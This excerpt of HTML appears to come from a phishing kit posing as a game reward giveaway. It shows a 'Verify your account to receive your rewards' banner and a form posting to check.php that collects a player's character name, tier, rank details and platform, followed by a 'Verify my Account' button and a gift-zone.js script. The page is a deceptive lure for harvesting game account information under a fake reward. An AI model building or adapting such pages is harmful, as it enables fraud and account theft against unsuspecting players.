...
<div class="alert-desc">Verify your account to receive your rewards</div>
</div> <!--- alert --->

<div class="box">

<center>
<form action="check.php" id="formLogin" method="post">
...
<input type="text" class="input-anjir"  name="nick" id="nick" placeholder="Character Name" autocomplete="off" required>
...
<select class="select-anjir" name="tier" id="tier" required>
...
<select class="select-anjir" name="rpt" id="rpt" required>
...
<select class="select-anjir" name="rpl" id="rpl" required>
...
<select class="select-anjir" name="platform" id="platform" required>
...
<button type="button" class="finish-btn" onmousedown="buka.play()">Verify my Account</button>
</form>
</center>
</div> <!--- box --->
...
<script src="js/gift-zone.js"></script>
